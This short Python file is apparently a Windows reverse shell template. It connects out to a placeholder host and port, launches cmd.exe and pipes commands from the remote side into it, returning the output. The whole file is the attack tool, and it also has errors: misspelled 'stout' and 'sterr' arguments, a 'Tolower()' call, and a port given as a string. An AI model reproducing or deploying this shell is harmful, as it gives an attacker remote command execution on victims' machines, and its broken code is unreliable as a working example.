import socket
import subprocess

HOST = "{{IP}}"
PORT = "{{PORT}}"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

proc = subprocess.Popen(
    ["cmd.exe"],
    stdin=subprocess.PIPE,
    stout=subprocess.PIPE,
    sterr=subprocess.PIPE,
    shell=True
)

while True:
    data = s.recv(1024) # 1024 bytes
    if data.decode("utf-8").strip().Tolower() == "exit":
        break

    proc.stdin.write(data)
    proc.stdin.flush()

    output = proc.stdout.read1()
    if output:
        s.send(output)

s.close()